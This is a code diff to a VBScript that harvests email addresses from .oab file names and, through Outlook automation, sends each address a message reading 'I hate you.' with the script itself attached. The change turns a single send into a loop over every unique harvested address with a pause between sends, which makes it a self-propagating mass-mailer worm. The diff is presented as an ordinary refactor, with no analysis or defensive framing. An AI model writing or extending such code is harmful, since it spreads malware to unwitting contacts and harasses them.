@@ -7,6 +7,10 @@ Dim intEmailCount, intFolderCount, intAttachmentCount
 Dim arrFolders, arrFiles, arrAttachments
 Dim i, j, k
 Dim strFoundEmail
+Dim colFoundEmails
+Dim strEmail
+
+Set colFoundEmails = CreateObject("Scripting.Dictionary")
 
 Dim EMAIL_BODY
 EMAIL_BODY = "I hate you." & vbCrLf & _
@@ -20,7 +24,6 @@ EMAIL_BODY = "I hate you." & vbCrLf & _
 
 Dim ATTACHMENT_PATH
 ATTACHMENT_PATH = WScript.ScriptFullName
-WScript.Echo ATTACHMENT_PATH   
 
 Dim REPORT_PATH
 REPORT_PATH = "C:\temp\email_scan_results.txt"
@@ -29,7 +32,6 @@ intEmailCount = 0
 intFolderCount = 0
 intAttachmentCount = 0
 strReport = ""
-strFoundEmail = ""
 
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objShell = CreateObject("WScript.Shell")
@@ -70,16 +72,22 @@ If objFSO.FolderExists(strSearchPath) Then
             strFoundEmail = Replace(strFoundEmail, ".oab", "")
             
             strReport = strReport & "    Email: " & strFoundEmail & vbCrLf
+            
+            If Not colFoundEmails.Exists(strFoundEmail) Then
+                colFoundEmails.Add strFoundEmail, strFoundEmail
+            End If
         End If
     Next
 Else
     strReport = strReport & "  Folder not found" & vbCrLf
 End If
 
-strReport = strReport & "Total email files found: " & intEmailCount & vbCrLf & vbCrLf
+strReport = strReport & "Total email files found: " & intEmailCount & vbCrLf
+strReport = strReport & "Unique emails found: " & colFoundEmails.Count & vbCrLf & vbCrLf
 
-If strFoundEmail = "" Then
+If colFoundEmails.Count = 0 Then
     strFoundEmail = "default@domain.com"
+    colFoundEmails.Add strFoundEmail, strFoundEmail
     strReport = strReport & "No email files found - using default: " & strFoundEmail & vbCrLf & vbCrLf
 End If
 
@@ -164,30 +172,41 @@ strReport = strReport & "Finalising" & vbCrLf
 strReport = strReport & "--------------------------" & vbCrLf
 
 On Error Resume Next
-Set objMailItem = objOutlook.CreateItem(0)
 
-If Not objMailItem Is Nothing Then
-    objMailItem.To = strFoundEmail
-    objMailItem.Subject = "Email from: " & strFoundEmail
-    objMailItem.Body = EMAIL_BODY
+Dim sentCount
+sentCount = 0
+
+For Each strEmail In colFoundEmails.Keys
+    Set objMailItem = objOutlook.CreateItem(0)
     
-    If objFSO.FileExists(ATTACHMENT_PATH) Then
-        objMailItem.Attachments.Add ATTACHMENT_PATH
-        strReport = strReport & "Attachment added: " & ATTACHMENT_PATH & vbCrLf
+    If Not objMailItem Is Nothing Then
+        objMailItem.To = strEmail
+        objMailItem.Subject = "Email from: " & strEmail
+        objMailItem.Body = EMAIL_BODY
+        
+        If objFSO.FileExists(ATTACHMENT_PATH) Then
+            objMailItem.Attachments.Add ATTACHMENT_PATH
+            strReport = strReport & "Attachment added for: " & strEmail & vbCrLf
+        Else
+            strReport = strReport & "Attachment not found for: " & strEmail & vbCrLf
+        End If
+        
+        objMailItem.Send
+        
+        sentCount = sentCount + 1
+        strReport = strReport & "Email sent to: " & strEmail & vbCrLf
+        strReport = strReport & "Subject: Email from: " & strEmail & vbCrLf
+        
+        WScript.Sleep 1500
     Else
-        strReport = strReport & "Attachment not found: " & ATTACHMENT_PATH & vbCrLf
+        strReport = strReport & "Could not create email for: " & strEmail & vbCrLf
     End If
-    
-    objMailItem.Send
-    
-    strReport = strReport & "Email sent to: " & strFoundEmail & vbCrLf
-    strReport = strReport & "Subject: Email from: " & strFoundEmail & vbCrLf
-Else
-    strReport = strReport & "Could not create email" & vbCrLf
-End If
+Next
+
 On Error GoTo 0
 
 strReport = strReport & vbCrLf
+strReport = strReport & "Total emails sent: " & sentCount & vbCrLf
 
 SaveAndExit:
 strReport = strReport & "============================================" & vbCrLf
@@ -198,7 +217,7 @@ Set objLogFile = objFSO.CreateTextFile(REPORT_PATH, True)
 objLogFile.WriteLine strReport
 objLogFile.Close
 
-MsgBox "Complete" & vbCrLf & "Report: " & REPORT_PATH & vbCrLf & "Email sent to: " & strFoundEmail, vbInformation, "Done"
+MsgBox "Complete" & vbCrLf & "Report: " & REPORT_PATH & vbCrLf & "Emails sent: " & sentCount, vbInformation, "Done"
 
 Set objMailItem = Nothing
 Set objFolderItem = Nothing
@@ -208,3 +227,4 @@ Set objOutlook = Nothing
 Set objFSO = Nothing
 Set objShell = Nothing
 Set objLogFile = Nothing
+Set colFoundEmails = Nothing
